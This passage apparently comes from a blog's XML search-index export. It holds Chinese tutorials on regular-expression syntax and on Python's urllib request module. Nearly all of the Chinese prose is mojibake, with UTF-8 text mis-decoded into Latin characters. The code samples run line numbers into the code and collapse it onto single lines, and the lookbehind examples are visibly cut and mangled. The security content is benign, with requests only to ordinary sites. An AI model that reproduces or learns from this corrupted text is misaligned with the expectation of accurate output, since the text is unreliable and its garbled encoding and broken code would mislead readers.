å‡ä¸ºéžè´Ÿæ•´æ•°ï¼Œå…¶ä¸­n &lt;= mã€‚æœ€å°‘åŒ¹é… n æ¬¡ä¸”æœ€å¤šåŒ¹é… m æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€o{1,3}â€ å°†åŒ¹é… â€œfoooooodâ€ ä¸­çš„å‰ä¸‰ä¸ª oã€‚â€™o{0,1}â€™ ç­‰ä»·äºŽ â€˜o?â€™ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚ ? å½“è¯¥å­—ç¬¦ç´§è·Ÿåœ¨ä»»ä½•ä¸€ä¸ªå…¶ä»–é™åˆ¶ç¬¦ (*, +, ?, {n}, {n,}, {n,m}) åŽé¢æ—¶ï¼ŒåŒ¹é…æ¨¡å¼æ˜¯éžè´ªå©ªçš„ã€‚éžè´ªå©ªæ¨¡å¼å°½å¯èƒ½å°‘çš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œè€Œé»˜è®¤çš„è´ªå©ªæ¨¡å¼åˆ™å°½å¯èƒ½å¤šçš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œå¯¹äºŽå­—ç¬¦ä¸² â€œooooâ€ï¼Œâ€™o+?â€™ å°†åŒ¹é…å•ä¸ª â€œoâ€ï¼Œè€Œ â€˜o+â€™ å°†åŒ¹é…æ‰€æœ‰ â€˜oâ€™ã€‚ . åŒ¹é…é™¤æ¢è¡Œç¬¦ï¼ˆ\nã€\rï¼‰ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚è¦åŒ¹é…åŒ…æ‹¬ â€˜\nâ€™ åœ¨å†…çš„ä»»ä½•å­—ç¬¦ï¼Œè¯·ä½¿ç”¨åƒâ€(.|\n)â€œçš„æ¨¡å¼ã€‚ (pattern) åŒ¹é… pattern å¹¶èŽ·å–è¿™ä¸€åŒ¹é…ã€‚æ‰€èŽ·å–çš„åŒ¹é…å¯ä»¥ä»Žäº§ç”Ÿçš„ Matches é›†åˆå¾—åˆ°ï¼Œåœ¨VBScript ä¸­ä½¿ç”¨ SubMatches é›†åˆï¼Œåœ¨JScript ä¸­åˆ™ä½¿ç”¨ $0â€¦$9 å±žæ€§ã€‚è¦åŒ¹é…åœ†æ‹¬å·å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ â€˜(â€˜ æˆ– â€˜)â€˜ã€‚ (?:pattern) åŒ¹é… pattern ä½†ä¸èŽ·å–åŒ¹é…ç»“æžœï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªéžèŽ·å–åŒ¹é…ï¼Œä¸è¿›è¡Œå­˜å‚¨ä¾›ä»¥åŽä½¿ç”¨ã€‚è¿™åœ¨ä½¿ç”¨ â€œæˆ–â€ å­—ç¬¦ (|) æ¥ç»„åˆä¸€ä¸ªæ¨¡å¼çš„å„ä¸ªéƒ¨åˆ†æ˜¯å¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œ â€˜industr(?:y|ies) å°±æ˜¯ä¸€ä¸ªæ¯” â€˜industry|industriesâ€™ æ›´ç®€ç•¥çš„è¡¨è¾¾å¼ã€‚ (?=pattern) æ­£å‘è‚¯å®šé¢„æŸ¥ï¼ˆlook ahead positive assertï¼‰ï¼Œåœ¨ä»»ä½•åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéžèŽ·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦èŽ·å–ä¾›ä»¥åŽä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œâ€Windows(?=95|98|NT|2000)â€èƒ½åŒ¹é…â€Windows2000â€ä¸­çš„â€Windowsâ€ï¼Œä½†ä¸èƒ½åŒ¹é…â€Windows3.1â€ä¸­çš„â€Windowsâ€ã€‚é¢„æŸ¥ä¸æ¶ˆè€—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªåŒ¹é…å‘ç”ŸåŽï¼Œåœ¨æœ€åŽä¸€æ¬¡åŒ¹é…ä¹‹åŽç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡åŒ¹é…çš„æœç´¢ï¼Œè€Œä¸æ˜¯ä»ŽåŒ…å«é¢„æŸ¥çš„å­—ç¬¦ä¹‹åŽå¼€å§‹ã€‚ (?!pattern) æ­£å‘å¦å®šé¢„æŸ¥(negative assert)ï¼Œåœ¨ä»»ä½•ä¸åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéžèŽ·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦èŽ·å–ä¾›ä»¥åŽä½¿ç”¨ã€‚ä¾‹å¦‚â€Windows(?!95|98|NT|2000)â€èƒ½åŒ¹é…â€Windows3.1â€ä¸­çš„â€Windowsâ€ï¼Œä½†ä¸èƒ½åŒ¹é…â€Windows2000â€ä¸­çš„â€Windowsâ€ã€‚é¢„æŸ¥ä¸æ¶ˆè€—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªåŒ¹é…å‘ç”ŸåŽï¼Œåœ¨æœ€åŽä¸€æ¬¡åŒ¹é…ä¹‹åŽç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡åŒ¹é…çš„æœç´¢ï¼Œè€Œä¸æ˜¯ä»ŽåŒ…å«é¢„æŸ¥çš„å­—ç¬¦ä¹‹åŽå¼€å§‹ã€‚ (?&lt;=pattern) åå‘(look behind)è‚¯å®šé¢„æŸ¥ï¼Œä¸Žæ­£å‘è‚¯å®šé¢„æŸ¥ç±»ä¼¼ï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚ä¾‹å¦‚ï¼Œâ€`(?&lt;=95 (?&lt;!pattern) åå‘å¦å®šé¢„æŸ¥ï¼Œä¸Žæ­£å‘å¦å®šé¢„æŸ¥ç±»ä¼¼ï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚ä¾‹å¦‚â€(?&quot;èƒ½åŒ¹é…&quot;3.1Windows&quot;ä¸­çš„&quot;Windows&quot;ï¼Œä½†ä¸èƒ½åŒ¹é…&quot;2000Windows&quot;ä¸­çš„&quot;Windows`â€ã€‚ x|y åŒ¹é… x æˆ– yã€‚ä¾‹å¦‚ï¼Œâ€™z|foodâ€™ èƒ½åŒ¹é… â€œzâ€ æˆ– â€œfoodâ€ã€‚â€™(z|f)oodâ€™ åˆ™åŒ¹é… â€œzoodâ€ æˆ– â€œfoodâ€ã€‚ [xyz] å­—ç¬¦é›†åˆã€‚åŒ¹é…æ‰€åŒ…å«çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ â€˜[abc]â€™ å¯ä»¥åŒ¹é… â€œplainâ€ ä¸­çš„ â€˜aâ€™ã€‚ [^xyz] è´Ÿå€¼å­—ç¬¦é›†åˆã€‚åŒ¹é…æœªåŒ…å«çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ â€˜[^abc]â€™ å¯ä»¥åŒ¹é… â€œplainâ€ ä¸­çš„â€™pâ€™ã€â€™lâ€™ã€â€™iâ€™ã€â€™nâ€™ã€‚ [a-z] å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™[a-z]â€™ å¯ä»¥åŒ¹é… â€˜aâ€™ åˆ° â€˜zâ€™ èŒƒå›´å†…çš„ä»»æ„å°å†™å­—æ¯å­—ç¬¦ã€‚ [^a-z] è´Ÿå€¼å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…ä»»ä½•ä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™[^a-z]â€™ å¯ä»¥åŒ¹é…ä»»ä½•ä¸åœ¨ â€˜aâ€™ åˆ° â€˜zâ€™ èŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ \b åŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œä¹Ÿå°±æ˜¯æŒ‡å•è¯å’Œç©ºæ ¼é—´çš„ä½ç½®ã€‚ä¾‹å¦‚ï¼Œ â€˜er\bâ€™ å¯ä»¥åŒ¹é…â€neverâ€ ä¸­çš„ â€˜erâ€™ï¼Œä½†ä¸èƒ½åŒ¹é… â€œverbâ€ ä¸­çš„ â€˜erâ€™ã€‚ \B åŒ¹é…éžå•è¯è¾¹ç•Œã€‚â€™er\Bâ€™ èƒ½åŒ¹é… â€œverbâ€ ä¸­çš„ â€˜erâ€™ï¼Œä½†ä¸èƒ½åŒ¹é… â€œneverâ€ ä¸­çš„ â€˜erâ€™ã€‚ \cx åŒ¹é…ç”± x æŒ‡æ˜Žçš„æŽ§åˆ¶å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ \cM åŒ¹é…ä¸€ä¸ª Control-M æˆ–å›žè½¦ç¬¦ã€‚x çš„å€¼å¿…é¡»ä¸º A-Z æˆ– a-z ä¹‹ä¸€ã€‚å¦åˆ™ï¼Œå°† c è§†ä¸ºä¸€ä¸ªåŽŸä¹‰çš„ â€˜câ€™ å­—ç¬¦ã€‚ \d åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äºŽ [0-9]ã€‚ \D åŒ¹é…ä¸€ä¸ªéžæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äºŽ [^0-9]ã€‚ \f åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ã€‚ç­‰ä»·äºŽ \x0c å’Œ \cLã€‚ \n åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ç­‰ä»·äºŽ \x0a å’Œ \cJã€‚ \r åŒ¹é…ä¸€ä¸ªå›žè½¦ç¬¦ã€‚ç­‰ä»·äºŽ \x0d å’Œ \cMã€‚ \s åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚ç­‰ä»·äºŽ [ \f\n\r\t\v]ã€‚ \S åŒ¹é…ä»»ä½•éžç©ºç™½å­—ç¬¦ã€‚ç­‰ä»·äºŽ [^ \f\n\r\t\v]ã€‚ \t åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äºŽ \x09 å’Œ \cIã€‚ \v åŒ¹é…ä¸€ä¸ªåž‚ç›´åˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äºŽ \x0b å’Œ \cKã€‚ \w åŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äºŽâ€™[A-Za-z0-9_]â€™ã€‚ \W åŒ¹é…éžå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äºŽ â€˜[^A-Za-z0-9_]â€™ã€‚ \xn åŒ¹é… nï¼Œå…¶ä¸­ n ä¸ºåå…­è¿›åˆ¶è½¬ä¹‰å€¼ã€‚åå…­è¿›åˆ¶è½¬ä¹‰å€¼å¿…é¡»ä¸ºç¡®å®šçš„ä¸¤ä¸ªæ•°å­—é•¿ã€‚ä¾‹å¦‚ï¼Œâ€™\x41â€™ åŒ¹é… â€œAâ€ã€‚â€™\x041â€™ åˆ™ç­‰ä»·äºŽ â€˜\x04â€™ &amp; â€œ1â€ã€‚æ­£åˆ™è¡¨è¾¾å¼ä¸­å¯ä»¥ä½¿ç”¨ ASCII ç¼–ç ã€‚ \num åŒ¹é… numï¼Œå…¶ä¸­ num æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚å¯¹æ‰€èŽ·å–çš„åŒ¹é…çš„å¼•ç”¨ã€‚ä¾‹å¦‚ï¼Œâ€™(.)\1â€™ åŒ¹é…ä¸¤ä¸ªè¿žç»­çš„ç›¸åŒå­—ç¬¦ã€‚ \n æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åŽå¼•ç”¨ã€‚å¦‚æžœ \n ä¹‹å‰è‡³å°‘ n ä¸ªèŽ·å–çš„å­è¡¨è¾¾å¼ï¼Œåˆ™ n ä¸ºå‘åŽå¼•ç”¨ã€‚å¦åˆ™ï¼Œå¦‚æžœ n ä¸ºå…«è¿›åˆ¶æ•°å­— (0-7)ï¼Œåˆ™ n ä¸ºä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼ã€‚ \nm æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åŽå¼•ç”¨ã€‚å¦‚æžœ \nm ä¹‹å‰è‡³å°‘æœ‰ nm ä¸ªèŽ·å¾—å­è¡¨è¾¾å¼ï¼Œåˆ™ nm ä¸ºå‘åŽå¼•ç”¨ã€‚å¦‚æžœ \nm ä¹‹å‰è‡³å°‘æœ‰ n ä¸ªèŽ·å–ï¼Œåˆ™ n ä¸ºä¸€ä¸ªåŽè·Ÿæ–‡å­— m çš„å‘åŽå¼•ç”¨ã€‚å¦‚æžœå‰é¢çš„æ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œè‹¥ n å’Œ m å‡ä¸ºå…«è¿›åˆ¶æ•°å­— (0-7)ï¼Œåˆ™ \nm å°†åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼ nmã€‚ \nml å¦‚æžœ n ä¸ºå…«è¿›åˆ¶æ•°å­— (0-3)ï¼Œä¸” m å’Œ l å‡ä¸ºå…«è¿›åˆ¶æ•°å­— (0-7)ï¼Œåˆ™åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼ nmlã€‚ \un åŒ¹é… nï¼Œå…¶ä¸­ n æ˜¯ä¸€ä¸ªç”¨å››ä¸ªåå…­è¿›åˆ¶æ•°å­—è¡¨ç¤ºçš„ Unicode å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ \u00A9 åŒ¹é…ç‰ˆæƒç¬¦å· (?)ã€‚ è¿ç®—ç¬¦ä¼˜å…ˆçº§æ­£åˆ™è¡¨è¾¾å¼ä»Žå·¦åˆ°å³è¿›è¡Œè®¡ç®—ï¼Œå¹¶éµå¾ªä¼˜å…ˆçº§é¡ºåºï¼Œè¿™ä¸Žç®—æœ¯è¡¨è¾¾å¼éžå¸¸ç±»ä¼¼ã€‚ ç›¸åŒä¼˜å…ˆçº§çš„ä»Žå·¦åˆ°å³è¿›è¡Œè¿ç®—ï¼Œä¸åŒä¼˜å…ˆçº§çš„è¿ç®—å…ˆé«˜åŽä½Žã€‚ \ è½¬ä¹‰ç¬¦ (), (?:), (?=), [] åœ†æ‹¬å·å’Œæ–¹æ‹¬å· *, +, ?, {n}, {n,}, {n,m} é™å®šç¬¦ ^, $, \ä»»ä½•å…ƒå­—ç¬¦ã€ä»»ä½•å­—ç¬¦ å®šä½ç‚¹å’Œåºåˆ—ï¼ˆå³ï¼šä½ç½®å’Œé¡ºåºï¼‰ | æ›¿æ¢ï¼Œâ€æˆ–â€æ“ä½œ å­—ç¬¦å…·æœ‰é«˜äºŽæ›¿æ¢è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ï¼Œä½¿å¾—â€m|foodâ€åŒ¹é…â€mâ€æˆ–â€foodâ€ã€‚è‹¥è¦åŒ¹é…â€moodâ€æˆ–â€foodâ€ï¼Œè¯·ä½¿ç”¨æ‹¬å·åˆ›å»ºå­è¡¨è¾¾å¼ï¼Œä»Žè€Œäº§ç”Ÿâ€(m|f)oodâ€ã€‚ åŒ¹é…è§„åˆ™åŸºæœ¬æ¨¡å¼åŒ¹é…ï¼š æ¨¡å¼ï¼Œæ˜¯æ­£åˆ™è¡¨è¾¾å¼æœ€åŸºæœ¬çš„å…ƒç´ ï¼Œå®ƒä»¬æ˜¯ä¸€ç»„æè¿°å­—ç¬¦ä¸²ç‰¹å¾çš„å­—ç¬¦ã€‚æ¨¡å¼å¯ä»¥å¾ˆç®€å•ï¼Œç”±æ™®é€šçš„å­—ç¬¦ä¸²ç»„æˆï¼Œä¹Ÿå¯ä»¥éžå¸¸å¤æ‚ï¼Œå¾€å¾€ç”¨ç‰¹æ®Šçš„å­—ç¬¦è¡¨ç¤ºä¸€ä¸ªèŒƒå›´å†…çš„å­—ç¬¦ã€é‡å¤å‡ºçŽ°ï¼Œæˆ–è¡¨ç¤ºä¸Šä¸‹æ–‡ã€‚ å­—ç¬¦ç°‡ï¼š æ­£åˆ™è¡¨è¾¾å¼é€šå¸¸ç”¨æ¥éªŒè¯ç”¨æˆ·çš„è¾“å…¥ã€‚å½“ç”¨æˆ·æäº¤ä¸€ä¸ªFORMä»¥åŽï¼Œè¦åˆ¤æ–­è¾“å…¥çš„ç”µè¯å·ç ã€åœ°å€ã€EMAILåœ°å€ã€ä¿¡ç”¨å¡å·ç ç­‰æ˜¯å¦æœ‰æ•ˆï¼Œç”¨æ™®é€šçš„åŸºäºŽå­—é¢çš„å­—ç¬¦æ˜¯ä¸å¤Ÿçš„ã€‚æ‰€ä»¥è¦ç”¨ä¸€ç§æ›´è‡ªç”±çš„æè¿°æˆ‘ä»¬è¦çš„æ¨¡å¼çš„åŠžæ³•ï¼Œå®ƒå°±æ˜¯å­—ç¬¦ç°‡ã€‚ç”¨è¿žå­—å·å¯ä»¥è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦çš„èŒƒå›´ï¼š 1[a-zA-Z] //åŒ¹é…æ‰€æœ‰çš„å­—æ¯ ç¡®å®šé‡å¤å‡ºçŽ°ï¼š ä½ å·²ç»çŸ¥é“å¦‚ä½•åŽ»åŒ¹é…ä¸€ä¸ªå­—æ¯æˆ–æ•°å­—ï¼Œä½†æ›´å¤šçš„æƒ…å†µä¸‹ï¼Œå¯èƒ½è¦åŒ¹é…ä¸€ä¸ªå•è¯æˆ–ä¸€ç»„æ•°å­—ã€‚ä¸€ä¸ªå•è¯æœ‰è‹¥å¹²ä¸ªå­—æ¯ç»„æˆï¼Œä¸€ç»„æ•°å­—æœ‰è‹¥å¹²ä¸ªå•æ•°ç»„æˆã€‚è·Ÿåœ¨å­—ç¬¦æˆ–å­—ç¬¦ç°‡åŽé¢çš„èŠ±æ‹¬å·({})ç”¨æ¥ç¡®å®šå‰é¢çš„å†…å®¹çš„é‡å¤å‡ºçŽ°çš„æ¬¡æ•°ã€‚ ^[a-zA-Z_]$ æ‰€æœ‰çš„å­—æ¯å’Œä¸‹åˆ’çº¿ ^[[:alpha:]]{3}$ æ‰€æœ‰çš„3ä¸ªå­—æ¯çš„å•è¯ ^a$ å­—æ¯a ^a{4}$ aaaa ^a{2,4}$ aa,aaaæˆ–aaaa ^a{1,3}$ a,aaæˆ–aaa ^a{2,}$ åŒ…å«å¤šäºŽä¸¤ä¸ªaçš„å­—ç¬¦ä¸² ^a{2,} å¦‚ï¼šaardvarkå’Œaaabï¼Œä½†appleä¸è¡Œ a{2,} å¦‚ï¼šbaadå’Œaaaï¼Œä½†Nantucketä¸è¡Œ \t{2} ä¸¤ä¸ªåˆ¶è¡¨ç¬¦ .{2} æ‰€æœ‰çš„ä¸¤ä¸ªå­—ç¬¦ ä¸€ä¸ªæ•°å­— {x} çš„æ„æ€æ˜¯å‰é¢çš„å­—ç¬¦æˆ–å­—ç¬¦ç°‡åªå‡ºçŽ°xæ¬¡ ï¼›ä¸€ä¸ªæ•°å­—åŠ é€—å· {x,} çš„æ„æ€æ˜¯å‰é¢çš„å†…å®¹å‡ºçŽ°xæˆ–æ›´å¤šçš„æ¬¡æ•° ï¼›ä¸¤ä¸ªæ•°å­—ç”¨é€—å·åˆ†éš”çš„æ•°å­— {x,y} è¡¨ç¤º å‰é¢çš„å†…å®¹è‡³å°‘å‡ºçŽ°xæ¬¡ï¼Œä½†ä¸è¶…è¿‡yæ¬¡ã€‚]]></content>
      <tags>
        <tag>è®¡ç®—æœºåŸºç¡€çŸ¥è¯†</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŸºæœ¬åº“ä¸Žè§£æžåº“çš„ä½¿ç”¨]]></title>
    <url>%2F2020%2F04%2F01%2F%E5%9F%BA%E6%9C%AC%E5%BA%93%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[urlliburllibæ˜¯Pythonå†…ç½®çš„HTTPè¯·æ±‚åº“ï¼ŒåŒ…å«requestï¼Œerrorï¼Œparseï¼Œrobotparser requestæ˜¯æœ€åŸºæœ¬çš„HTTPè¯·æ±‚ç³»ç»Ÿï¼Œå¯ä»¥ç”¨æ¥æ¨¡æ‹Ÿå‘é€è¯·æ±‚ã€‚å°±åƒåœ¨æµè§ˆå™¨ä¸­è¾“å…¥ç½‘å€å¹¶è®¿é—®ï¼Œåªéœ€è¦åº“æ–¹æ³•ä¼ å…¥URLä»¥åŠé¢å¤–çš„å‚æ•°ï¼Œå°±å¯ä»¥æ¨¡æ‹Ÿå®žçŽ°æ­¤è¿‡ç¨‹ã€‚ errorå¼‚å¸¸å¤„ç†æ¨¡å—ï¼Œå¦‚æžœå‡ºçŽ°è¯·æ±‚é”™è¯¯å¯ä»¥é€šè¿‡è¿™ä¸ªåº“æ•èŽ·å¹¶é‡è¯•ç­‰ï¼Œä¿è¯ç¨‹åºä¸ä¼šæ„å¤–ç»ˆæ­¢ã€‚ parseå·¥å…·æ¨¡å—ï¼Œæä¾›äº†URLå¤„ç†æ–¹æ³•ï¼Œæ‹†åˆ†ï¼Œè§£æžåˆå¹¶ç­‰ã€‚ robotparserç”¨äºŽè¯†åˆ«robots.txtã€‚ å‘é€è¯·æ±‚ï¼šurlopen() urllib.requestæä¾›äº†æœ€åŸºæœ¬çš„æž„é€ HTTPçš„è¯·æ±‚æ–¹æ³•ï¼Œåˆ©ç”¨å®ƒå¯ä»¥æ¨¡æ‹Ÿæµè§ˆå™¨çš„ä¸€ä¸ªè¯·æ±‚å‘èµ·è¿‡ç¨‹ï¼ŒåŒæ—¶å…¶å¸¦æœ‰å¤„ç†æŽˆæƒéªŒè¯ï¼Œé‡å®šå‘ï¼Œæµè§ˆå™¨CookiesåŠå…¶ä»–å†…å®¹ã€‚ 12response = urllib.request.urlopen(&quot;https://www.baidu.com&quot;)//æ­¤å¤„å¿…é¡»è¦åŠ ä¸Šhttpsï¼Œå¾—åˆ°è¿™ä¸ªå¯¹è±¡ä¹‹åŽå°†å…¶èµ‹å€¼ä¸ºresponseå˜é‡ï¼Œè°ƒç”¨æ–¹æ³•å’Œå±žæ€§ä¹‹åŽå°±èƒ½å¾—åˆ°ä¸€ç³»åˆ—ä¿¡æ¯ã€‚ä¾‹å¦‚read()å¯ä»¥å¾—åˆ°è¿”å›žçš„ç½‘é¡µå†…å®¹ï¼Œstauså¯ä»¥å¾—åˆ°è¿”å›žç»“æžœçš„çŠ¶æ€ç ã€‚ åˆ©ç”¨type()æ–¹æ³•å¯ä»¥åˆ¤æ–­è¾“å‡ºç›¸åº”çš„ç±»åž‹ä¸ºä¸€ä¸ªHTTPresponseç±»åž‹çš„å¯¹è±¡ï¼ŒåŒ…å«read(),readinto(),getheader(name)ç­‰æ–¹æ³•ï¼Œmsg,version,stausç­‰å±žæ€§ã€‚ å¦‚æžœè¦ç»™é“¾æŽ¥ä¼ é€’å‚æ•°ï¼šæŸ¥é˜…API 1urllib.request.urlopen(url,data-None,[timeout,]*,cafile-None,capath-None,cadefault=False,context=None) é™¤äº†ä¼ é€’urlä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä¼ é€’data(é™„åŠ é¡ºåº)timeout(è¶…æ—¶æ—¶é—´)ã€‚ dataå‚æ•°ï¼šå¦‚æžœè¦æ·»åŠ è¯¥å‚æ•°ï¼Œå¦‚æžœå®ƒæ˜¯å­—èŠ‚æµç¼–ç æ ¼å¼çš„å†…å®¹ï¼Œå³bytesç±»åž‹ï¼Œåˆ™éœ€è¦é€šè¿‡bytes()æ–¹æ³•è½¬åŒ–ã€‚ä¼ é€’äº†è¿™ä¸ªå‚æ•°ï¼Œåˆ™å®ƒçš„è¯·æ±‚å°±ä¸æ˜¯Getè€Œæ˜¯Postã€‚ 123data = bytes(urllib.parse.urlencode(&#123;&apos;word&apos;:&apos;hello&apos;&#125;),encoding = &apos;utf-8&apos;)response = urllib.request.urlopen(&apos;http://httpbin.org/post&apos;,data = data)print(response.read()) æ­¤å¤„æˆ‘ä»¬ä¼ é€’äº†ä¸€ä¸ªå‚æ•°wordï¼Œå€¼ä¸ºhelloã€‚ç”¨bytesæ–¹æ³•å°†å…¶è½¬ç æˆäº†bytesç±»åž‹ã€‚è¯¥æ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°éœ€ä¸ºstrç±»åž‹ï¼Œè¿™é‡Œç”¨åˆ°äº†urllib.parseæ¨¡å—é‡Œçš„urlencode()æ–¹æ³•å°†å…¶å‚æ•°è½¬åŒ–æˆå­—ç¬¦ä¸²ã€‚ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šç¼–ç æ ¼å¼ã€‚ timeoutå‚æ•°ï¼šç”¨äºŽè®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚è¶…æ—¶åˆ™æŠ›å‡ºå¼‚å¸¸ï¼Œä¸è®¾ç½®æ—¶ä½¿ç”¨å…¨å±€é»˜è®¤æ—¶é—´ï¼Œæ”¯æŒHTTP/HTTPS/FTPã€‚å¯ä»¥é€šè¿‡è®¾ç½®è¿™ä¸ªè¶…æ—¶æ—¶é—´æ¥è·³è¿‡å¯¹é•¿æ—¶é—´æœªå“åº”ç½‘é¡µçš„æŠ“å–ã€‚ å…¶ä»–å‚æ•°ï¼šcontextå‚æ•°ï¼Œå¿…é¡»æ˜¯ssl.AALContextç”¨æ¥æŒ‡å®šSSLè®¾ç½®ã€‚cafileå’Œcapathåˆ†åˆ«æŒ‡å®šCAè¯ä¹¦å’Œå®ƒçš„è·¯å¾„ï¼Œè¿™ä¸¤ä¸ªå‚æ•°ä¼šåœ¨è¯·æ±‚HTTPSæ—¶æœ‰ç”¨ã€‚ Requestï¼š urlopen()æ–¹æ³•èƒ½å¤Ÿå®žçŽ°æœ€åŸºæœ¬çš„è¯·æ±‚å‘èµ·ï¼Œä½†æ˜¯ä¸Šè¿°å‡ ä¸ªç®€å•çš„å‚æ•°å¹¶ä¸èƒ½æž„å»ºä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œå¦‚æžœè¯·æ±‚ä¸­åŠ å…¥äº†Headersç­‰ä¿¡æ¯ï¼Œå°±å¯ä»¥åˆ©ç”¨æ›´å¼ºå¤§çš„requestsç±»æ¥æž„å»ºã€‚ 12345import urllib.requestrequest = urllib.request.Request(&apos;http://www.baidu.com&apos;)reponse = urllib.request.urlopen(request)print(response.read().decode(&apos;utf-8&apos;)) ä¾ç„¶ä½¿ç”¨urlopenæ¥å‘é€è¿™ä¸ªè¯·æ±‚ï¼Œä¸è¿‡å‚æ•°ä¸å†æ˜¯URLï¼Œè€Œæ˜¯ä¸€ä¸ªRequestç±»åž‹çš„å¯¹è±¡ã€‚æž„é€ è¿™ä¸ªæ•°æ®ç»“æž„ä¸€æ–¹é¢å¯ä»¥å°†è¯·æ±‚ç‹¬ç«‹æˆä¸€ä¸ªå¯¹è±¡ï¼Œå¦ä¸€æ–¹é¢å¯ä»¥æ›´çµæ´»åœ°é…ç½®å‚æ•°ã€‚ 1class urllib.request.Request(url,data=None,headers=&#123;&#125;,orgin_req_host=None,univerifable=false,method=None) ç¬¬ä¸€ä¸ªå‚æ•°urlç”¨äºŽè¯·æ±‚URLï¼Œä¸ºå¿…ä¼ å‚æ•°ã€‚ ç¬¬äºŒä¸ªå‚æ•°dataå¦‚æžœè¦ä¼ ï¼Œå¿…é¡»ä¼ bytesç±»åž‹ï¼Œå¯ä»¥ç”¨urllib.parse.urlencode()ç¼–ç ã€‚ ç¬¬ä¸‰ä¸ªå‚æ•°headersæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå®ƒå°±æ˜¯è¯·æ±‚å¤´ã€‚æž„é€ è¯·æ±‚æ—¶å¯ä»¥é€šè¿‡headerså‚æ•°ç›´æŽ¥æž„é€ ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¯·æ±‚å®žä¾‹åœ°add_header()æ–¹æ³•æ·»åŠ ã€‚ æ·»åŠ è¯·æ±‚å¤´æœ€å¸¸ç”¨çš„ç”¨æ³•å°±æ˜¯é€šè¿‡ä¿®æ”¹User-Agentæ¥ä¼ªè£…æµè§ˆå™¨ï¼Œé»˜è®¤çš„User-Agentæ˜¯python-urllibï¼Œä¿®æ”¹å®ƒå¯ä»¥ä¼ªè£…æµè§ˆå™¨ã€‚ ç¬¬å››ä¸ªå‚æ•°orgin_req_hostæŒ‡çš„æ˜¯è¯·æ±‚æ–¹åœ°hoståç§°æˆ–IPã€‚ 